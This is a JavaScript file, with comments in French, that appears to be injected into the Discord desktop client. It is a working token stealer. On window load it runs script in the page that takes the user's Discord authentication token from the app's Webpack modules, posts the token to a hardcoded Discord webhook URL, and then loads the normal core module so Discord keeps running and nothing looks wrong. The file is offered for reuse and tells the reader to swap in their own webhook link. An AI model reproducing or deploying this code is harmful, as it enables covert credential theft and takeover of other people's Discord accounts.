const { BrowserWindow } = require("electron");
const https = require("https");

// Envoie le token au webhook Discord
function sendToWebhook(content) {
    const data = JSON.stringify({ content });

    const options = {
        hostname: "discord.com",
        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // 🔁 Remplace par ton propre lien
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    };

    const req = https.request(options, res => {
        console.log("Webhook status:", res.statusCode);
    });

    req.on("error", error => {
        console.error("Erreur webhook:", error);
    });

    req.write(data);
    req.end();
}

// Récupère le token Discord depuis Webpack une fois que l'interface est prête
function getToken() {
    const windows = BrowserWindow.getAllWindows();

    for (const win of windows) {
        win.webContents.on("did-finish-load", () => {
            win.webContents.executeJavaScript(`
                new Promise((resolve) => {
                    const check = () => {
                        if (window.webpackChunkdiscord_app) {
                            try {
                                window.webpackChunkdiscord_app.push([
                                    [Math.random()],
                                    {},
                                    (e) => {
                                        for (let c in e.c) {
                                            let m = e.c[c]?.exports;
                                            if (m?.default?.getToken !== undefined) {
                                                resolve(m.default.getToken());
                                                return;
                                            }
                                        }
                                        resolve(null);
                                    }
                                ]);
                            } catch (err) {
                                resolve(null);
                            }
                        } else {
                            setTimeout(check, 100); // attend que Webpack soit prêt
                        }
                    };
                    check();
                });
            `).then(token => {
                if (token) {
                    console.log("✅ Token récupéré :", token);
                    sendToWebhook("🎯 Token Discord: " + token);
                } else {
                    console.warn("⚠️ Aucun token trouvé.");
                }
            }).catch(err => {
                console.error("❌ Erreur JS :", err);
            });
        });
    }
}

console.log("🚀 Script injection démarré");
getToken();

// Recharge le cœur de Discord normalement
module.exports = require('./core.asar');
